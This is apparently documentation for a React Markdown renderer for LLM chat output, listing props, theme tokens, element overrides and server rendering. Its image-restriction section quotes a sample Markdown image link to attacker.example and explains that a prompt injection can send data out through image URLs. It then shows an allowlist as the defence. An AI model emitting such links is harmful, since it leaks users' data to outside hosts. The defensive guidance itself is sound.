# Web renderer

```tsx
import { MarkdownView } from 'react-llm-markdown';
import 'react-llm-markdown/styles.css';

<MarkdownView streaming={!done}>{text}</MarkdownView>;
```

`MarkdownView` renders on the server as plain Markdown. In the browser it then loads Shiki, KaTeX, Mermaid and ECharts on
demand, so the first paint stays light. Works with React 18 and 19.

## Props

| Prop | Default | |
|---|---|---|
| `children` | — | The Markdown source. |
| `streaming` | `false` | `true` while text is still arriving: repairs incomplete Markdown and fades new words in. |
| `features` | all on | `{ code, math, mermaid, echarts, cjk }` — set one to `false` to never load it. |
| `softBreaks` | `true` | A single newline becomes a line break, as in chat. `false` for standard Markdown. |
| `isImageAllowed` | all | `(url) => boolean`. A refused image shows its alt text and is never requested. |
| `className` | — | Extra class on the wrapper `<div class="rlm-markdown">`. |
| `components` | — | Element overrides, merged over the built-in safe link and image components. |
| `tableMaxHeight` | `300` | Tables taller than this scroll inside (px or CSS length; `0` = no limit). |
| `codeBlockMaxHeight` | `400` | Code blocks taller than this scroll inside (`0` = no limit). |
| `lineNumbers` | `true` | Line numbers in code blocks. |

Install every peer listed in [Getting started](getting-started) even if you turn a feature off: bundlers resolve the
on-demand imports at build time.

## Restricting images

Images from any http(s) host load by default. An image URL is also how a prompt injection sends data out
(`![](https://attacker.example/?q=…)`), so for untrusted answers allow only your own hosts:

```tsx
<MarkdownView isImageAllowed={(url) => url.startsWith('https://cdn.example.com/')}>{text}</MarkdownView>
```

## Theme

Dark mode follows a `dark` class or `data-theme="dark"` on an ancestor (usually `<html>`). Colors are CSS variables:

```css
:root {
  --rlm-link: #7c3aed;
  --rlm-card: #f8fafc;
  --rlm-chart-height: 400px;
}
```

| Token | Used for |
|---|---|
| `--rlm-background`, `--rlm-foreground` | Base colors of rich blocks and controls |
| `--rlm-muted`, `--rlm-muted-foreground` | Block headers, secondary text |
| `--rlm-border` | Borders, table rules |
| `--rlm-card` | Surface of code, tables, diagrams and charts |
| `--rlm-primary`, `--rlm-primary-foreground` | Buttons inside blocks |
| `--rlm-sidebar`, `--rlm-ring` | Overlay surfaces, focus rings |
| `--rlm-link` | Links |
| `--rlm-chart-height` | ECharts height |

With shadcn/ui, map them to your theme, e.g. `--rlm-background: hsl(var(--background));`.

## Overriding elements

`components` replaces how an element renders. The safe link and image components stay unless you override `a` or
`img` yourself — if you do, keep `rel="noopener noreferrer"` and `referrerPolicy="no-referrer"`.

```tsx
<MarkdownView components={{ hr: () => <hr className="my-divider" /> }}>{text}</MarkdownView>
```

## Server rendering

On the server the view renders GFM (tables, lists, footnotes) without the rich plugins; they attach in the browser.
Charts, diagrams and highlighted code appear after hydration.
